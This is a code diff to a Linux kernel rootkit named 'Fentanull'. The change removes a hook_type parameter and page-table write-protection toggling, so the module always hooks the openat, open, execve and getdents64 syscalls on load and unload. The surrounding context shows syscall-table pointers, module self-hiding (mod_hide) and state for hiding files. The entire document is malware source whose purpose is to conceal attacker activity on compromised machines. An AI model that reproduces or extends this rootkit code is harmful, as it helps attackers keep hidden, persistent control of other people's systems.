@@ -49,7 +49,6 @@ struct linux_dirent
 static unsigned long *syscall_table; 
 static pte_t *pte; 
 static struct fentanull_info hidden; 
-static int hook_type; 
 static int owned;
 
 typedef asmlinkage long (*old_openat_type)(int dirfd, const char *pathname, int flags, mode_t mode);
@@ -64,8 +63,6 @@ old_openat_type old_openat;
 old_execve_type old_execve; 
 old_kill_type old_kill; 
 old_getdents64_type old_getdents64; 
-
-module_param(hook_type, int, S_IRUSR);
 
 /* the kernel will know if WP in cr0 has been modified in write_cr0, 
  * so we need to create our own vesion to bypass this */
@@ -406,26 +403,11 @@ static int __init fentanull_init(void)
 		#ifdef HIDE_MODULES_ON_LOAD
 		mod_hide(); 
 		#endif 
-		if (hook_type == 1)
-		{
-			set_openat(1); 
-			set_execve(1); 
-			set_open(1);
-			set_getdents64(1);
-			return 0;	
-		}       
-		else if (hook_type == 0)
-		{
-			pte_enable(1);
-			set_openat(1); 
-			set_open(1); 
-			set_execve(1); 
-			set_getdents64(1);
-			pte_enable(0);
-			return 0;
-		}
-		else 
-			return -1;
+		set_openat(1); 
+		set_execve(1); 
+		set_open(1);
+		set_getdents64(1);
+		return 0;	
 	}
 }
 
@@ -434,22 +416,11 @@ static void __exit fentanull_exit(void)
 	#ifdef DEBUG
 	printk(KERN_ALERT "[-] rk: Fentanull is exiting...\n"); 
 	#endif 
-	if (hook_type == 1)
-	{
-		set_execve(0); 
-		set_open(0); 
-		set_getdents64(0);
-		set_openat(0);
-	}
-	else if (hook_type == 0)
-	{
-		pte_enable(1);
-		set_execve(0); 
-		set_open(0); 
-		set_openat(0); 	
-		set_getdents64(0);
-		pte_enable(0);
-	}
+	set_execve(0); 
+	set_open(0); 
+	set_getdents64(0);
+	set_openat(0);
+	
 } 
 
 module_init(fentanull_init);
